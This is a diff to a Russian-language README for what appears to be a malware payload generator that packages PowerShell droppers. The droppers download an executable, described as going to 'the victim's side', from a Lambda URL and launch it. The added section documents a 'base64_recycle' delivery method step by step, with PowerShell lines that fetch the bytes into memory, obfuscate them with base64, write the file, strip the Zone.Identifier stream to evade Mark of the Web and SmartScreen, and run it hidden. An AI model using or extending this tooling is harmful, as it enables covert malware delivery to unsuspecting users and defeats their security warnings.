@@ -73,6 +73,7 @@ python3 generate.py
 | `TARGET_FILENAME` | нет | `cat.exe` | Имя скачиваемого файла на стороне жертвы |
 | `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
 | `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP-архивов |
+| `DELIVERY_METHOD` | нет | `webclient` | Метод доставки payload (см. ниже) |
 
 Пример `.env`:
 
@@ -80,6 +81,7 @@ python3 generate.py
 LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
 API_KEY=your-api-key-here
 TARGET_FILENAME=cat.exe
+DELIVERY_METHOD=webclient
 ```
 
 Альтернативно -- через `export`:
@@ -87,8 +89,122 @@ TARGET_FILENAME=cat.exe
 ```bash
 export LAMBDA_URL='https://...'
 export API_KEY='...'
+export DELIVERY_METHOD='base64_recycle'
 python3 generate.py
 ```
+
+## Методы доставки (DELIVERY_METHOD)
+
+### `webclient` (по умолчанию)
+
+Классический метод -- скачать файл и запустить.
+
+```
+PS1 выполняет:
+1. WebClient.DownloadFile(url, path)   -- скачивает файл на диск
+2. Start-Process path                  -- запускает
+```
+
+**Плюсы:** простой, минимальный код, надёжный.
+**Минусы:** `DownloadFile()` автоматически ставит Mark of the Web (Zone.Identifier ADS) на скачанный файл. SmartScreen может заблокировать запуск.
+
+### `base64_recycle` (обход MOTW)
+
+Продвинутый метод -- скачать байты в память, создать файл через base64-декодирование, удалить метку MOTW.
+
+```
+PS1 выполняет:
+1. WebClient.DownloadData(url)         -- скачивает БАЙТЫ в память (не файл!)
+2. [Convert]::ToBase64String(bytes)    -- кодирует байты в base64-строку
+3. [Convert]::FromBase64String(b64)    -- декодирует обратно в байты
+4. [IO.File]::WriteAllBytes(path, bytes) -- записывает файл через .NET I/O
+5. Remove-Item -Stream Zone.Identifier -- удаляет метку MOTW (страховка)
+6. Start-Process path                  -- запускает
+```
+
+**Как это обходит MOTW -- подробно:**
+
+#### Шаг 1: DownloadData вместо DownloadFile
+
+| | `DownloadFile()` | `DownloadData()` |
+|---|---|---|
+| Что делает | Скачивает файл и сохраняет на диск | Скачивает данные в `byte[]` в RAM |
+| Создаёт файл? | Да, сразу | Нет, только массив байт в памяти |
+| MOTW (Zone.Identifier)? | **Да** -- Windows помечает файл как скачанный из интернета | **Нет** -- файла нет, метить нечего |
+
+Ключевой момент: MOTW (Mark of the Web) -- это NTFS Alternate Data Stream (ADS) с именем `Zone.Identifier`. Windows добавляет его **только когда файл создаётся через "скачивание"** (браузер, `DownloadFile`, сохранение из Office и т.д.). Если файл создаётся программно через обычный файловый I/O -- метки нет.
+
+#### Шаг 2: Base64 encode/decode
+
+```
+Байты из RAM -> ToBase64String() -> текстовая строка -> FromBase64String() -> байты
+```
+
+Это промежуточный слой обфускации. Данные проходят через текстовое представление (base64) и обратно. На диск пока ничего не пишется. В итоге имеем тот же `byte[]`, но через трансформацию.
+
+#### Шаг 3: WriteAllBytes
+
+```csharp
+[System.IO.File]::WriteAllBytes("C:\Users\...\cat.exe", $bytes)
+```
+
+Это стандартная .NET операция записи файла. Она:
+- **НЕ** вызывает URL Security Zone Manager
+- **НЕ** добавляет Zone.Identifier ADS
+- Просто пишет байты на диск, как если бы файл был создан локально
+
+Для Windows этот файл -- "локальный", не из интернета.
+
+#### Шаг 4: Remove-Item -Stream (страховка)
+
+```powershell
+Remove-Item -Path $path -Stream Zone.Identifier -ErrorAction SilentlyContinue
+```
+
+На случай если Windows всё-таки пометил файл (например, через zone propagation от процесса PowerShell, который сам мог быть запущен из помеченного скрипта):
+
+- `Zone.Identifier` -- это NTFS ADS (альтернативный поток данных), прикреплённый к файлу
+- `Remove-Item -Stream` удаляет **только этот поток**, сам файл не трогает
+- `-ErrorAction SilentlyContinue` -- если потока нет (и так чисто), ошибки не будет
+
+После удаления: файл существует, работает, но для Windows он "чистый" -- не из интернета.
+
+#### Шаг 5: Запуск
+
+```powershell
+Start-Process -FilePath $path -WindowStyle Hidden
+```
+
+SmartScreen проверяет Zone.Identifier при запуске exe. Его нет -> нет предупреждения -> файл запускается.
+
+#### Сравнение методов
+
+| Этап | `webclient` | `base64_recycle` |
+|------|-------------|------------------|
+| Скачивание | `DownloadFile()` -> файл с MOTW | `DownloadData()` -> байты в RAM |
+| Запись на диск | Уже есть (с меткой) | `WriteAllBytes` (без метки) |
+| Zone.Identifier | **Есть** | **Удалён / не создан** |
+| SmartScreen | Может заблокировать | Не срабатывает |
+| Обфускация | Шифр + Base64 (URL) | Шифр + Base64 (URL) + Base64 (payload) |
+
+#### Что такое Zone.Identifier (MOTW)
+
+Когда ты скачиваешь файл через браузер или `DownloadFile`, Windows создаёт скрытый поток данных:
+
+```
+cat.exe                     -- основной файл (сам exe)
+cat.exe:Zone.Identifier     -- ADS (скрытый поток)
+```
+
+Содержимое `Zone.Identifier`:
+```ini
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=https://...
+HostUrl=https://...
+```
+
+`ZoneId=3` означает "Internet Zone". При запуске exe Windows видит эту метку и показывает предупреждение SmartScreen. Метод `base64_recycle` не создаёт этот поток, а если он случайно появился -- удаляет.
 
 ## Структура проекта
 
